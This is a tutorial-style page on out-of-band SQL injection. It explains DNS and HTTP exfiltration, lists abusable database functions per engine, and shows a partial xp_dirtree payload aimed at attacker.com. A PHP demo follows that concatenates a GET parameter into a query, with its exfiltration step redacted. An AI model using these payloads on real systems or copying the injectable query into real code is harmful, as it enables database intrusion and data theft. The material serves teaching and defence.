# Out-of-Band-SQL-Injection-(OOB-SQLi) 🚨

**Out-of-Band SQL Injection (OOB SQLi)** 🔗

> Out-of-Band SQL Injection is a sophisticated SQL injection technique where data is exfiltrated through a separate communication channel rather than through the same channel used to submit the injection. This method exploits the database's ability to send requests, such as DNS or HTTP calls, to an attacker-controlled server.
> 

---

## How OOB SQLi Works 🧭

- The attacker discovers a vulnerable input where SQL queries execute without proper sanitization.
- Instead of receiving a direct response, the injected SQL forces the database server to send data to an external server controlled by the attacker.
- The attacker captures this outbound request to obtain sensitive information.

---

## Common Techniques 🔥

- **DNS Exfiltration:** Forcing the database to make DNS lookups to a domain controlled by the attacker containing encoded data.
- **HTTP Requests:** Using functions to make HTTP requests that carry data to the attacker’s server.

---

## Database-Specific Methods 🗂️

| Database | Technique | Example Function/Procedure |
| --- | --- | --- |
| Oracle | Send HTTP requests via network | UTL_HTTP package |
| Microsoft SQL | Trigger SMB or DNS requests | xp_dirtree extended procedure |
| PostgreSQL | Use COPY to a remote file | COPY command |
| MySQL | Load remote files to exfiltrate | LOAD_FILE combined with DNS |

---

## Example Payloads 🧩

- **SQL Server:**
    
    *(example payloads are partially visible in the image and begin with SQL Server payload examples such as `EXEC xp_dirtree '\\attacker.com\leakdata\` ...` )*
    

---

## obb-sql.php

<?php
include("connection.php");
?>

<!DOCTYPE html>
<html>
<head>
<title>Out-of-Band SQL Injection Demo</title>
</head>
<body>

<div style="margin-top:70px;color:#000; font-size:23px; text-align:center">
<h1>Out-of-Band SQL Injection Demo<br>
<font size="3" color="#666666">
<?php
if (isset($_GET['id'])) {
$id = $_GET['id'];

```
  // Vulnerable query
  $query = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  $result = mysqli_query($connection, $query);

  if ($result) {
    // Attempt an out-of-band action to leak data via DNS request or external URL fetch
    // Simulates DNS exfiltration payload using LOAD_FILE (needs appropriate permissions)

    /* [REDACTED: dangerous outbound/exfiltration query removed here]
       — This originally attempted to force the database to make external/DNS requests
       (e.g. using LOAD_FILE / remote file / network call). I cannot include the exact code. */

    // mysqli_query($connection, $oob_query);   <-- redacted

    echo "Query executed. Check attacker.com for DNS requests if MySQL allows it.";
  } else {
    echo "Query failed.";
  }
} else {
  echo "Provide an 'id' parameter to trigger SQL query.";
}

?>
</font>
</h1>
</div></body>
</html>
```
